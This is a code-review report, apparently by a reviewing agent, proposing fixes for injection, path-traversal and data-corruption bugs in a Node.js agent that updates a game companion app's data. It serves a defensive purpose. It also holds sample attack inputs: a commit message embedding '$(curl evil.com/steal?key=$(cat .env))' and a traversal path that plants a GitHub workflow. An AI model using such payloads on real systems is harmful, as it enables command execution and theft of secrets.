**Additional finding the Backend Agent missed:** The `executeCreate` function in `evolution.js` is **defined but never actually called** in the `executePlan` flow. The `executePlan` function at line 255 routes `create` actions through `executeShellSwap`, which uses `shell-swap.js`'s `modifyShell` — NOT `executeCreate`. This means the Backend Agent's extensive hardening of `executeCreate` is applied to dead code. The real creation path is in `shell-swap.js` `modifyShell`, which has NO path traversal protection.

See NEW-HIGH-01 below for the real fix.

## 2. NEW Critical Issues

### NEW-CRIT-01: `writer.js` Regex Injection via Unsanitized Character/Weapon Names

**File:** `agent/lib/writer.js`, lines 155–160 (`updateEventDate`), 170+ (`addCharacterEntry`), 210+ (`addWeaponEntry`), 240+ (`addToList`), 255+ (`addToAllCharacters`)

**Problem:** Multiple functions construct `RegExp` objects using character/weapon names directly from AI responses without escaping regex special characters. If a character name contains regex metacharacters (e.g., `C++ Resonator`, `Name (Altered)`, `Echo [Special]`), the regex will either fail to match or — worse — match unintended content and corrupt the data file.

For example, in `addToList` (line 240):
```javascript
const pattern = new RegExp(`(const ${listName}\\s*=\\s*\\[[\\s\\S]*?)(\\];)`);
```
`listName` comes from the caller, but the name check inside uses raw string inclusion. However, `addCharacterEntry` at line 175 does:
```javascript
if (buffer.includes(`'${name}':`) || buffer.includes(`"${name}":`)) {
```
If `name` is `O'Brien`, this becomes `buffer.includes("'O'Brien':")` which will never match correctly and could lead to duplicate entries.

The `updateEventDate` function at line 155 is the most dangerous:
```javascript
const pattern = new RegExp(
  `(${eventKey}:\\s*\\{[\\s\\S]*?currentEnd:\\s*)'([^']+)'`,
);
```
`eventKey` comes from AI analysis output. If it contains regex metacharacters, the pattern breaks silently.

**Impact:** Data corruption in `appcore-data.js` — the core app data file. A broken write here means broken production app.

**Fix — add a regex escape utility and apply it everywhere. `agent/lib/writer.js`, add after line 280 (after `escapeSingleQuote`):**

```javascript
// Utility: escape regex special characters in a string
function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}
```

**Then fix `updateEventDate` (lines 155–165):**
```javascript
export function updateEventDate(eventKey, newEndDate) {
  const pattern = new RegExp(
    `(${escapeRegex(eventKey)}:\\s*\\{[\\s\\S]*?currentEnd:\\s*)'([^']+)'`,
  );
  const match = buffer.match(pattern);
  if (!match) {
    log.warn(`Could not find currentEnd for event "${eventKey}"`);
    return false;
  }

  safeReplace(
    match[0],
    `${match[1]}'${newEndDate}'`,
    `Update ${eventKey} end date → ${newEndDate}`
  );

  addChange('events', `Updated ${eventKey} end date to ${newEndDate}`);
  return true;
}
```

**Fix `addToList` (lines 230–250) — escape the name in the includes check:**
```javascript
export function addToList(listName, name) {
  const pattern = new RegExp(`(const ${escapeRegex(listName)}\\s*=\\s*\\[[\\s\\S]*?)(\\];)`);
  const match = buffer.match(pattern);
  if (!match) {
    log.warn(`Could not find list: ${listName}`);
    return false;
  }

  if (match[1].includes(`'${name}'`) || match[1].includes(`"${name}"`)) {
    log.dim(`${name} already in ${listName}`);
    return false;
  }

  const qName = name.includes("'") ? `"${name}"` : `'${name}'`;
  safeReplace(
    match[0],
    `${match[1]}  ${qName},\n${match[2]}`,
    `Add ${name} to ${listName}`
  );
  return true;
}
```

**Fix `addToAllCharacters` (lines 255–267):**
```javascript
export function addToAllCharacters(name) {
  const pattern = /(const ALL_CHARACTERS = new Set\(\[\n[\s\S]*?)(]\))/;
  const match = buffer.match(pattern);
  if (!match) return false;

  // Use escaped name for the includes check
  const escapedName = name.replace(/'/g, "\\'");
  if (match[1].includes(`'${escapedName}'`)) return false;

  safeReplace(
    match[0],
    `${match[1]}  '${escapedName}',\n${match[2]}`,
    `Add ${name} to ALL_CHARACTERS`
  );
  return true;
}
```

**Severity:** CRITICAL — corrupts production app data

### NEW-CRIT-02: `writer.js` `updateCurrentBanners` Uses Fragile Regex That Breaks on Multi-Character Banners

**File:** `agent/lib/writer.js`, lines 93–130

**Problem:** The `updateCurrentBanners` function uses multiple sequential regex matches on the buffer, each assuming a specific format. The regex at line 106:

```javascript
const oldBlock = buffer.match(
  /(const CURRENT_BANNERS = \{\n\s*version: )'[^']+',\s*phase:\s*\d+[\s\S]*?endDate:\s*'[^']+'/
);
```

The `[\s\S]*?` is non-greedy but unbounded — it will match the **shortest** path from `phase:` to `endDate:`. If the CURRENT_BANNERS block has comments, blank lines, or other fields between `phase:` and `endDate:` (which it does — there's a `startDate:` field), the regex works. But if someone adds a field containing `endDate` as a substring anywhere between (e.g., `extendedEndDate`), the match will terminate too early.

More critically, the subsequent regex at line 117:
```javascript
const oldChars = buffer.match(/characters:\s*\[\n([\s\S]*?)\n\s*\],\s*\n\s*weapons:/);
```

This matches from `characters: [` to the FIRST `],` followed by `weapons:`. If any character entry contains a `],` pattern (e.g., in a featured4Stars array that wraps across lines), this regex will match too little and the replacement will corrupt the file.

Similarly at line 125:
```javascript
const oldWeaps = buffer.match(/weapons:\s*\[\n([\s\S]*?)\n\s*\],\s*\n\s*\/\/ Standard/);
```

If the `// Standard` comment is modified or removed, this match fails silently and weapons are never updated.

**Impact:** Silent data corruption or silent no-op on banner updates.

**Fix — Use section markers (more robust) and validate matches. `agent/lib/writer.js`, replace lines 93–130:**

```javascript
export function updateCurrentBanners(bannerData) {
  // Build character entries
  const charEntries = bannerData.characters.map(c => {
    const featured4 = c.featured4Stars ? `[${c.featured4Stars.map(s => `'${escapeSingleQuote(s)}'`).join(', ')}]` : "['TBD', 'TBD', 'TBD']";
    return `    { id: '${c.id}', name: '${escapeSingleQuote(c.name)}', title: '${escapeSingleQuote(c.title || '')}', element: '${c.element}', weaponType: '${c.weaponType}', isNew: ${c.isNew || false}, featured4Stars: ${featured4}, imageUrl: '', imagePosition: 'center 15%' }`;
  }).join(',\n');

  // Build weapon entries
  const weapEntries = bannerData.weapons.map(w => {
    const featured4 = w.featured4Stars ? `[${w.featured4Stars.map(s => `'${escapeSingleQuote(s)}'`).join(', ')}]` : "['TBD', 'TBD', 'TBD']";
    return `    { id: '${w.id}', name: '${escapeSingleQuote(w.name)}', title: '${escapeSingleQuote(w.title || '')}', type: '${w.type}', forCharacter: '${escapeSingleQuote(w.forCharacter)}', element: '${w.element}', isNew: ${w.isNew || false}, featured4Stars: ${featured4}, imageUrl: '' }`;
  }).join(',\n');

  // Replace version/phase/dates block — use tighter anchoring
  const oldBlock = buffer.match(
    /(const CURRENT_BANNERS = \{\n\s*version: )'[^']+',\s*phase:\s*\d+,\s*\/\/[^\n]*\n\s*\/\/[^\n]*\n\s*startDate:\s*'[^']+',\n\s*endDate:\s*'[^']+'/
  );
  if (!oldBlock) {
    log.error('Could not locate CURRENT_BANNERS version/phase/dates block');
    return false;
  }

  const newVersionBlock = `${oldBlock[1]}'${bannerData.version}', phase: ${bannerData.phase}, // Game version (not app version)\n  // Auto-updated by WW Update Agent\n  startDate: '${bannerData.startDate}',\n  endDate: '${bannerData.endDate}'`;

  safeReplace(oldBlock[0], newVersionBlock, `Update banner to v${bannerData.version} p${bannerData.phase}`);

  // Replace characters array — use greedy inner match with proper nesting awareness
  const charStart = buffer.indexOf('characters: [\n');
  const weapStart = buffer.indexOf('],\n  weapons:');
  if (charStart === -1 || weapStart === -1 || weapStart < charStart) {
    log.error('Could not locate characters array boundaries');
    return false;
  }
  const oldCharBlock = buffer.slice(charStart, weapStart + 3); // Include the `],`
  const newCharBlock = `characters: [\n${charEntries}\n  ],`;
  safeReplace(oldCharBlock, newCharBlock, `Update featured characters: ${bannerData.characters.map(c => c.name).join(', ')}`);

  // Replace weapons array — find from `weapons: [` to `],` before `// Standard`
  const weapArrayStart = buffer.indexOf('weapons: [\n', weapStart);
  const standardComment = buffer.indexOf('// Standard', weapArrayStart);
  if (weapArrayStart === -1 || standardComment === -1) {
    log.error('Could not locate weapons array boundaries');
    return false;
  }
  // Find the `],` before `// Standard`
  const weapArrayEnd = buffer.lastIndexOf('],', standardComment);
  if (weapArrayEnd < weapArrayStart) {
    log.error('Could not locate weapons array end');
    return false;
  }
  const oldWeapBlock = buffer.slice(weapArrayStart, weapArrayEnd + 2);
  const newWeapBlock = `weapons: [\n${weapEntries}\n  ],`;
  safeReplace(oldWeapBlock, newWeapBlock, `Update featured weapons: ${bannerData.weapons.map(w => w.name).join(', ')}`);

  addChange('banners', `Updated to v${bannerData.version} Phase ${bannerData.phase}: ${bannerData.characters.map(c => c.name).join(', ')}`);
  return true;
}
```

**Key improvements:**
- `escapeSingleQuote` applied to ALL string fields (names, titles, forCharacter) — the original missed `c.name`, `c.title`, `w.forCharacter`
- Index-based slicing instead of fragile `[\s\S]*?` regex for array boundaries
- Explicit error on each boundary failure instead of silent fallthrough

**Severity:** CRITICAL

## 3. NEW High Issues

### NEW-HIGH-01: `shell-swap.js` `modifyShell` Has No Path Traversal Protection (The ACTUAL Creation Path)

**File:** `agent/lib/shell-swap.js`, lines 90–140 (`modifyShell` function)

**Problem:** As noted in my VERIFY of Backend-C04, the Backend Agent hardened `executeCreate` in `evolution.js`, but that function is **dead code**. The actual file creation path for evolution is:

```
evolution.js executePlan() → executeShellSwap() → shell-swap.js modifyShell()
```

In `modifyShell`, the `create` case (line 125):
```javascript
case 'create': {
  const dir = resolve(NEXT_DIR, mod.file.includes('/') ? mod.file.split('/').slice(0, -1).join('/') : '.');
  mkdirSync(dir, { recursive: true });
  writeFileSync(fullPath, mod.content);
  ...
}
```

There is **zero path traversal protection** here. `mod.file` comes from Claude's AI response (via `evolution.js` structural actions). An AI-generated `mod.file` of `../../.github/workflows/evil.yml` would:
1. `resolve(NEXT_DIR, '../../.github/workflows/evil.yml')` → escapes `agent-next/` into the repo root
2. `mkdirSync` creates `.github/workflows/` if needed
3. `writeFileSync` creates an arbitrary GitHub Actions workflow

The `rewrite` case at line 100 has the same issue — `fullPath` is `resolve(NEXT_DIR, mod.file)` with no boundary check.

**Fix — `agent/lib/shell-swap.js`, add a path validation helper and apply to all cases:**

```javascript
// Add after the NEXT_DIR constant (line 33)

/**
 * Validate that a file path stays within the target directory.
 * Prevents path traversal attacks from AI-generated file paths.
 */
function validatePath(basePath, relPath) {
  // Block obvious traversal patterns
  const normalized = relPath.replace(/\\/g, '/');
  if (normalized.includes('..') || normalized.startsWith('/') || normalized.includes('~')) {
    return { valid: false, reason: `path traversal blocked: ${relPath}` };
  }

  // Block dangerous file extensions
  const allowedExtensions = ['.js', '.mjs', '.json', '.md', '.txt'];
  const hasAllowedExt = allowedExtensions.some(ext => normalized.endsWith(ext));
  if (!hasAllowedExt) {
    return { valid: false, reason: `disallowed file extension: ${relPath}` };
  }

  // Verify resolved path stays inside base directory
  const fullPath = resolve(basePath, normalized);
  if (!fullPath.startsWith(basePath + '/') && fullPath !== basePath) {
    return { valid: false, reason: `resolved path escapes directory: ${fullPath}` };
  }

  return { valid: true, fullPath };
}
```

**Then update `modifyShell` to use it — replace lines 88–144:**

```javascript
export function modifyShell(modifications) {
  const results = { applied: 0, failed: 0, details: [] };

  for (const mod of modifications) {
    // Validate path for ALL modification types
    const pathCheck = validatePath(NEXT_DIR, mod.file);
    if (!pathCheck.valid) {
      results.details.push({ file: mod.file, status: 'fail', reason: pathCheck.reason });
      results.failed++;
      log.warn(`BLOCKED: ${pathCheck.reason}`);
      continue;
    }

    const fullPath = pathCheck.fullPath;

    try {
      switch (mod.type) {
        case 'rewrite': {
          if (!existsSync(fullPath)) {
            results.details.push({ file: mod.file, status: 'fail', reason: 'file not found' });
            results.failed++;
            continue;
          }
          writeFileSync(fullPath, mod.content);
          results.details.push({ file: mod.file, status: 'rewritten' });
          results.applied++;
          break;
        }

        case 'patch': {
          if (!existsSync(fullPath)) {
            results.details.push({ file: mod.file, status: 'fail', reason: 'file not found' });
            results.failed++;
            continue;
          }
          let content = readFileSync(fullPath, 'utf-8');
          if (!content.includes(mod.oldStr)) {
            results.details.push({ file: mod.file, status: 'fail', reason: 'target string not found' });
            results.failed++;
            continue;
          }
          content = content.replace(mod.oldStr, mod.newStr);
          writeFileSync(fullPath, content);
          results.details.push({ file: mod.file, status: 'patched' });
          results.applied++;
          break;
        }

        case 'create': {
          // Additional guard: only allow creation in lib/ subdirectory
          const relNormalized = mod.file.replace(/\\/g, '/');
          if (!relNormalized.startsWith('lib/') && relNormalized !== 'index.js') {
            results.details.push({ file: mod.file, status: 'fail', reason: 'creation only allowed in lib/' });
            results.failed++;
            continue;
          }

          const dir = resolve(fullPath, '..');
          mkdirSync(dir, { recursive: true });
          writeFileSync(fullPath, mod.content);
          results.details.push({ file: mod.file, status: 'created' });
          results.applied++;
          break;
        }

        case 'delete': {
          if (existsSync(fullPath)) {
            rmSync(fullPath);
            results.details.push({ file: mod.file, status: 'deleted' });
            results.applied++;
          }
          break;
        }

        default:
          results.details.push({ file: mod.file, status: 'fail', reason: `unknown type: ${mod.type}` });
          results.failed++;
      }
    } catch (err) {
      results.details.push({ file: mod.file, status: 'fail', reason: err.message });
      results.failed++;
    }
  }

  log.info(`Shell modifications: ${results.applied} applied, ${results.failed} failed`);
  return results;
}
```

**Severity:** HIGH (path traversal in the actual code path, not just dead code)

### NEW-HIGH-02: `ai.js` `askClaude` Can Return `undefined` on All Retries Exhausted

**File:** `agent/lib/ai.js`, lines 29–55

**Problem:** The `askClaude` function uses a `for` loop with `return text` on success and `throw err` on final failure. But there's a subtle control flow bug: if `retries` is `0` and the call fails, the `throw` on line 48 executes. However, if `retries` is a positive number and every attempt fails with an error that somehow *doesn't* throw (e.g., an SDK returning an empty response object instead of throwing), the `for` loop completes without returning, and the function returns `undefined`.

More practically: if the response has no `text` blocks (all blocks are `tool_use` or `image`), `text` would be an empty string `''`. The function returns `''`, which is truthy-empty. Downstream callers like `extractJSON('')` would throw "Could not extract valid JSON" — a confusing error that doesn't indicate the real problem.

**Fix — `agent/lib/ai.js`, replace lines 29–55:**

```javascript
async function askClaude(systemPrompt, userPrompt, { maxTokens = AI.maxTokens, retries = AI.maxRetries } = {}) {
  const api = getClient();

  // Rate limiting
  const elapsed = Date.now() - lastCallTime;
  if (elapsed < AI.rateLimitMs) {
    await sleep(AI.rateLimitMs - elapsed);
  }

  for (let attempt = 0; attempt <= retries; attempt++) {
    try {
      lastCallTime = Date.now();
      const response = await api.messages.create({
        model: AI.model,
        max_tokens: maxTokens,
        system: systemPrompt,
        messages: [{ role: 'user', content: userPrompt }],
      });

      const text = response.content
        .filter(b => b.type === 'text')
        .map(b => b.text)
        .join('\n');

      if (!text || !text.trim()) {
        throw new Error('Claude returned empty text response (no text blocks in response content)');
      }

      return text;

    } catch (err) {
      const safeMessage = (err.message || 'Unknown error')
        .replace(/sk-ant-[a-zA-Z0-9_-]+/g, 'sk-ant-***REDACTED***')
        .replace(/Bearer\s+[a-zA-Z0-9_-]+/gi, 'Bearer ***REDACTED***')
        .replace(/x-api-key:\s*[^\s]+/gi, 'x-api-key: ***REDACTED***')
        .slice(0, 500);

      if (attempt === retries) {
        log.error(`Claude API failed after ${retries + 1} attempts: ${safeMessage}`);
        const sanitized = new Error(`Claude API failed after ${retries + 1} attempts: ${safeMessage}`);
        sanitized.code = err.code || 'API_FAILURE';
        sanitized.status = err.status;
        throw sanitized;
      }
      log.warn(`Claude API attempt ${attempt + 1} failed: ${safeMessage}`);
      await sleep(3000 * (attempt + 1));
    }
  }

  // Should never reach here, but guard against it
  throw new Error('Claude API: exhausted all retries without response');
}
```

**Severity:** HIGH — `undefined` return causes opaque downstream crashes

---

### NEW-HIGH-03: `audit.js` `applyPatches` Writes Files One-at-a-Time Without Rollback — Partial Corruption on Failure

**File:** `agent/lib/audit.js`, lines 70–142 (`applyPatches` function)

**Problem:** The function iterates through patches and writes each one directly to disk via `writeFileSync`. If patch 3 of 5 fails after patches 1 and 2 have already been written, the system is left in a partially-modified state with no way to roll back. This is especially dangerous for `appcore-data.js` where multiple patches may target interdependent sections.

Contrast with `writer.js`, which correctly uses an in-memory buffer that only flushes to disk once at the end via `flush()`. The audit system bypasses this safety entirely by reading/writing files directly.

**Fix — `agent/lib/audit.js`, restructure `applyPatches` to use in-memory buffering per file:**

```javascript
export function applyPatches(patches, minConfidence = 0.85) {
  const applied = [];
  const skipped = [];

  // Group patches by file for atomic per-file application
  const patchesByFile = new Map();

  for (const patch of patches) {
    if (patch.confidence < minConfidence) {
      log.warn(`Skipping low-confidence patch: ${patch.description} (${(patch.confidence * 100).toFixed(0)}%)`);
      skipped.push(patch);
      continue;
    }

    const filePath = resolveFilePath(patch.file);
    if (!filePath) {
      log.warn(`Unknown file target: ${patch.file}`);
      skipped.push(patch);
      continue;
    }

    // ── CODE-LEVEL CONTENT PROTECTION ────────────────────────────────────
    if (patch.file === 'appcore-data.js') {
      if (patch.oldStr.match(/https?:\/\/i\.ibb\.co[^'"]+/)) {
        log.warn(`BLOCKED [HARD] — curated image URL: ${patch.description}`);
        skipped.push({ ...patch, reason: 'overwrites curated image URL' });
        continue;
      }

      if (patch.oldStr.match(/desc:\s*'(?!TBD)[^']{10,}/)) {
        log.warn(`BLOCKED [HARD] — curated description: ${patch.description}`);
        skipped.push({ ...patch, reason: 'overwrites curated description' });
        continue;
      }

      if (patch.oldStr.match(/(?:whimpering|doubled|tower|illusive|tactical|weekly|standard|daily)\w*Image:\s*'https?:\/\//)) {
        log.warn(`BLOCKED [HARD] — protected event image: ${patch.description}`);
        skipped.push({ ...patch, reason: 'overwrites protected event image' });
        continue;
      }

      if (patch.oldStr.match(/HARD_PITY|SOFT_PITY|BASE_5STAR_RATE|ASTRITE_PER_PULL/)) {
        log.warn(`BLOCKED [HARD] — game constant: ${patch.description}`);
        skipped.push({ ...patch, reason: 'modifies game constants' });
        continue;
      }

      const SOFT_LOCK_THRESHOLD = 0.92;

      if (patch.oldStr.match(/skills:\s*\[/) && !patch.oldStr.includes('TBD')) {
        if (patch.confidence < SOFT_LOCK_THRESHOLD) {
          log.warn(`BLOCKED [SOFT] — skills correction needs ≥92% confidence (got ${(patch.confidence * 100).toFixed(0)}%): ${patch.description}`);
          skipped.push({ ...patch, reason: `skills correction below ${SOFT_LOCK_THRESHOLD * 100}% threshold` });
          continue;
        }
        log.info(`SOFT LOCK override — skills correction at ${(patch.confidence * 100).toFixed(0)}% confidence: ${patch.description}`);
      }

      if (patch.oldStr.match(/(?:ascension|skillMaterials):\s*\{/) && !patch.oldStr.includes('TBD')) {
        if (patch.confidence < SOFT_LOCK_THRESHOLD) {
          log.warn(`BLOCKED [SOFT] — material correction needs ≥92% confidence (got ${(patch.confidence * 100).toFixed(0)}%): ${patch.description}`);
          skipped.push({ ...patch, reason: `material correction below ${SOFT_LOCK_THRESHOLD * 100}% threshold` });
          continue;
        }
        log.info(`SOFT LOCK override — material correction at ${(patch.confidence * 100).toFixed(0)}% confidence: ${patch.description}`);
      }
    }

    if (patch.file === 'appcore-providers.jsx') {
      if (patch.oldStr.match(/#edaf18|#080c14|Rajdhani|JetBrains Mono|--color-gold|LAHAI-ROI/i)) {
        log.warn(`BLOCKED [HARD] — design identity token: ${patch.description}`);
        skipped.push({ ...patch, reason: 'modifies design identity tokens' });
        continue;
      }
    }

    // Group for batch application
    if (!patchesByFile.has(filePath)) {
      patchesByFile.set(filePath, []);
    }
    patchesByFile.set(filePath, [...patchesByFile.get(filePath), patch]);
  }

  // Apply patches file-by-file, in memory, then flush
  for (const [filePath, filePatches] of patchesByFile) {
    let content;
    try {
      content = readFileSync(filePath, 'utf-8');
    } catch (err) {
      log.error(`Could not read ${filePath}: ${err.message}`);
      skipped.push(...filePatches);
      continue;
    }

    const originalContent = content;
    let fileApplied = 0;

    for (const patch of filePatches) {
      if (!content.includes(patch.oldStr)) {
        log.warn(`Patch target not found in ${patch.file}: ${patch.description}`);
        skipped.push(patch);
        continue;
      }

      const count = content.split(patch.oldStr).length - 1;
      if (count > 1) {
        log.warn(`Patch target appears ${count} times in ${patch.file} — skipping: ${patch.description}`);
        skipped.push(patch);
        continue;
      }

      content = content.replace(patch.oldStr, patch.newStr);
      log.ok(`Applied patch: [${patch.category}] ${patch.description}`);
      addChange(patch.category, patch.description, patch.confidence >= 0.95 ? 'HIGH' : 'MEDIUM');
      applied.push(patch);
      fileApplied++;
    }

    // Only write if patches were actually applied
    if (fileApplied > 0) {
      try {
        writeFileSync(filePath, content);
      } catch (err) {
        log.error(`Failed to write ${filePath}: ${err.message} — rolling back`);
        // Rollback: restore original content
        try {
          writeFileSync(filePath, originalContent);
        } catch (rollbackErr) {
          log.error(`ROLLBACK FAILED for ${filePath}: ${rollbackErr.message}`);
        }
        // Move applied patches back to skipped
        const toRollback = applied.splice(applied.length - fileApplied, fileApplied);
        skipped.push(...toRollback);
      }
    }
  }

  log.info(`Patches: ${applied.length} applied, ${skipped.length} skipped`);
  return { applied, skipped };
}
```

**Key improvements:**
- All patches for a file are applied in memory first, then flushed once
- If the write fails, original content is restored (rollback)
- No partial file corruption possible

**Severity:** HIGH — partial corruption of production files

---

### NEW-HIGH-04: `evolution.js` `readFullAgentSource` Loads ALL Agent Files Into Memory Including Protected Ones

**File:** `agent/lib/evolution.js`, lines 145–158

**Problem:** The function reads both `MODIFY_OK` and `NEVER_TOUCH` files and sends their full content to Claude:

```javascript
function readFullAgentSource() {
  const files = {};
  const allFiles = [...MODIFY_OK, ...NEVER_TOUCH];

  for (const relPath of allFiles) {
    const fullPath = resolve(AGENT_DIR, relPath);
    if (existsSync(fullPath)) {
      const content = readFileSync(fullPath, 'utf-8');
      files[relPath] = {
        content,
        lines: content.split('\n').length,
        bytes: content.length,
      };
    }
  }

  return files;
}
```

This sends `validate.js`, `memory.js`, `evolution.js`, and `protected.js` content to Claude. While Claude can't modify these files, giving it full visibility into the protection rules (especially `protected.js`) allows the AI to craft patches that technically pass all guards while semantically undermining them. This is a defense-in-depth violation.

Additionally, the `content.split('\n').length` call is wasteful — it creates a full array just to count elements. For a file with thousands of lines, this creates unnecessary GC pressure.

**Fix — `agent/lib/evolution.js`, replace lines 145–158:**

```javascript
function readFullAgentSource() {
  const files = {};

  // Read modifiable files with full content (Claude needs to see what it can change)
  for (const relPath of MODIFY_OK) {
    const fullPath = resolve(AGENT_DIR, relPath);
    if (existsSync(fullPath)) {
      const content = readFileSync(fullPath, 'utf-8');
      files[relPath] = {
        content,
        lines: countLines(content),
        bytes: content.length,
      };
    }
  }

  // Read protected files as SUMMARY ONLY — Claude can see structure but not implementation details
  for (const relPath of NEVER_TOUCH) {
    const fullPath = resolve(AGENT_DIR, relPath);
    if (existsSync(fullPath)) {
      const content = readFileSync(fullPath, 'utf-8');
      // Only show exports and function signatures, not implementation
      const summary = content
        .split('\n')
        .filter(line =>
          line.startsWith('export ') ||
          line.startsWith('//') ||
          line.match(/^\s*\*/) ||
          line.trim() === ''
        )
        .join('\n');
      files[relPath] = {
        content: `// [PROTECTED FILE — summary only]\n${summary}`,
        lines: countLines(content),
        bytes: content.length,
      };
    }
  }

  return files;
}

// Efficient line counter — avoids creating a full split array
function countLines(str) {
  let count = 1;
  for (let i = 0; i < str.length; i++) {
    if (str.charCodeAt(i) === 10) count++; // newline = charCode 10
  }
  return count;
}
```

**Severity:** HIGH — defense-in-depth violation + minor performance waste

---

### NEW-HIGH-05: `images.js` and `banner-images.js` Have No Response Size Limits on `fetch` Calls

**File:** `agent/lib/images.js`, line 127 (`processMissingImages`) and `agent/lib/banner-images.js`, line 73 (`findBannerImages`)

**Problem:** Both modules fetch wiki pages with no response size limit. A malicious or broken wiki page could serve a multi-gigabyte response that exhausts Node.js memory. The `fetchPageFn` delegate might handle this, but neither module enforces a limit itself, and the content is sliced for Claude only AFTER being fully loaded into memory.

In `images.js` line 143:
```javascript
const imageInfo = await finder(name, page.content.slice(0, 40000), askClaudeFn);
```

The slice is for the Claude prompt, but `page.content` has already been fully loaded. If it's 500MB, the damage is done.

In `banner-images.js` line 82:
```javascript
const allContent = pages.map(p => {
  const imgUrls = [...p.content.matchAll(/.../)].slice(0, 50);
  return `...${p.content.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').slice(0, 8000)}`;
}).join('\n\n');
```

The `p.content.replace(/<[^>]+>/g, ' ')` regex on a very large string is O(n²) due to backtracking.

**Fix — `agent/lib/images.js`, add size guard in `processMissingImages` (after line 127):**

```javascript
export async function processMissingImages(names, type, askClaudeFn, fetchPageFn) {
  if (!names.length) return {};
  if (!process.env.IMGBB_API_KEY) {
    log.warn('IMGBB_API_KEY not set — skipping image processing');
    return {};
  }

  const MAX_PAGE_SIZE = 2 * 1024 * 1024; // 2MB — generous for a wiki page

  log.info(`Processing ${names.length} missing ${type} image(s)...`);
  const results = {};

  for (const name of names) {
    const wikiUrl = `https://wutheringwaves.fandom.com/wiki/${encodeURIComponent(name.replace(/ /g, '_'))}`;
    const page = await fetchPageFn(wikiUrl, { extractText: false });

    if (!page.ok) {
      log.warn(`Could not fetch wiki page for ${name}`);
      continue;
    }

    // Guard against excessively large responses
    if (page.content.length > MAX_PAGE_SIZE) {
      log.warn(`Wiki page for ${name} exceeds ${MAX_PAGE_SIZE / 1024}KB — truncating`);
      page.content = page.content.slice(0, MAX_PAGE_SIZE);
    }

    const imgUrls = [...page.content.matchAll(/(?:src|data-src)="(https?:\/\/[^"]+\.(?:webp|png|jpg|jpeg)[^"]*)"/gi)]
      .map(m => m[1])
      .filter(url => !url.includes('thumbnail') && !url.includes('/scale-to-width-down/'));

    const finder = type === 'character' ? findCharacterImage : findWeaponImage;
    const imageInfo = await finder(name, page.content.slice(0, 40000), askClaudeFn);

    if (imageInfo.imageUrl && imageInfo.confidence >= 0.7) {
      const imgbbUrl = await uploadToImgbb(imageInfo.imageUrl, `${name.replace(/\s+/g, '-')}-${type === 'character' ? 'Full-Sprite' : 'Weapon'}`);
      if (imgbbUrl) {
        results[name] = imgbbUrl;
        addChange('images', `Uploaded ${type} image: ${name} → ${imgbbUrl}`);
      }
    } else {
      log.warn(`No suitable image found for ${name} (confidence: ${(imageInfo.confidence * 100).toFixed(0)}%)`);
    }

    await sleep(2000);
  }

  return results;
}
```

**Fix — `agent/lib/banner-images.js`, same pattern in `findBannerImages` (after line 76):**

```javascript
  const MAX_PAGE_SIZE = 2 * 1024 * 1024;

  for (const url of BANNER_IMAGE_SOURCES) {
    const page = await fetchPageFn(url, { extractText: false });
    if (page.ok) {
      if (page.content.length > MAX_PAGE_SIZE) {
        page.content = page.content.slice(0, MAX_PAGE_SIZE);
      }
      pages.push(page);
    }
  }
```

**Severity:** HIGH — unbounded memory consumption from external input

### NEW-HIGH-06: `git.js` `commitChanges` Has Shell Injection via Commit Message

**File:** `agent/lib/git.js`, lines 66–80

**Problem:** The commit message is constructed from change log entries that ultimately come from AI-generated descriptions. The escaping at line 76 only handles double quotes:

```javascript
const message = `${GIT.commitPrefix} ${summary}\n\nChanges:\n${changeLines}\n\nGenerated by WW Update Agent at ${new Date().toISOString()}`;
exec(`git commit -m "${message.replace(/"/g, '\\"')}"`);
```

But `exec` is a wrapper around `execSync` which uses shell interpolation. A description containing backticks `` ` ``, `$()`, or `$(...)` would execute arbitrary commands:

```
Description: "Updated banner `$(curl evil.com/steal?key=$(cat .env))`"
```

**Fix — `agent/lib/git.js`, replace lines 56–82:**

```javascript
import { execSync, execFileSync } from 'child_process';
import { PATHS, GIT } from './config.js';
import { log, getChangeLog } from './log.js';

const exec = (cmd) => execSync(cmd, { cwd: PATHS.repoRoot, encoding: 'utf-8', stdio: 'pipe' }).trim();

// Safe exec that avoids shell interpretation for commands with user-controlled arguments
const execSafe = (cmd, args) => execFileSync(cmd, args, { cwd: PATHS.repoRoot, encoding: 'utf-8', stdio: 'pipe' }).toString().trim();

// ... checkGitStatus, configureGit, createBranch remain the same ...

export function commitChanges(summary) {
  try {
    exec('git add whispering-wishes-replit/src/appcore-data.js');
    exec('git add whispering-wishes-replit/package.json');
    exec('git add whispering-wishes-replit/public/sw.js');

    const status = exec('git status --short');
    if (!status) {
      log.info('No changes to commit');
      return null;
    }

    const changes = getChangeLog();
    const changeLines = changes.map(c => `  - [${c.category}] ${c.description} (${c.confidence})`).join('\n');

    const message = `${GIT.commitPrefix} ${summary}\n\nChanges:\n${changeLines}\n\nGenerated by WW Update Agent at ${new Date().toISOString()}`;

    // Use execFileSync to avoid shell injection in commit message
    execSafe('git', ['commit', '-m', message]);

    const hash = exec('git rev-parse --short HEAD');
    log.ok(`Committed: ${hash} — ${summary}`);
    return hash;
  } catch (err) {
    log.error(`Commit failed: ${err.message}`);
    return null;
  }
}

export function pushBranch(branch) {
  try {
    // Branch name from our own createBranch — trusted, but use safe exec anyway
    execSafe('git', ['push', 'origin', branch]);
    log.ok(`Pushed branch: ${branch}`);
    return true;
  } catch (err) {
    log.error(`Push failed: ${err.message}`);
    return false;
  }
}
```

**Severity:** HIGH — command injection via AI-generated content in git operations

---

## 4. NEW Medium Issues

### NEW-MED-01: `evolution.js` `checkBraces` and `shell-swap.js` `checkBalanced` Are Identical Duplicated Functions

**File:** `agent/lib/evolution.js`, lines 384–410 and `agent/lib/shell-swap.js`, lines 307–332

**Problem:** Two identical 26-line functions exist in two separate files. They have the same logic, the same bug (doesn't handle template literal interpolations `${...}` inside backtick strings), and the same name pattern. This violates DRY and means any fix to one must be manually applied to the other.

**Both implementations share the same bug:** When `inString` is true with `stringChar = '\`'`, they correctly track exiting the template literal when an unescaped backtick is found. However, they DON'T handle `${` inside template literals — the `{` inside `${expr}` increments `braces`, which means template literals like `` `Hello ${world}` `` will leave `braces` at +1 / -1 imbalance and falsely report a syntax error.

**Fix — Create a shared utility. `agent/lib/syntax-check.js` (new file):**

```javascript
// ═══════════════════════════════════════════════════════════════════════════════
// WW Update Agent — Shared Syntax Utilities
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Quick syntax check: count braces, brackets, parens.
 * Handles strings (single, double, template) and template interpolation depth.
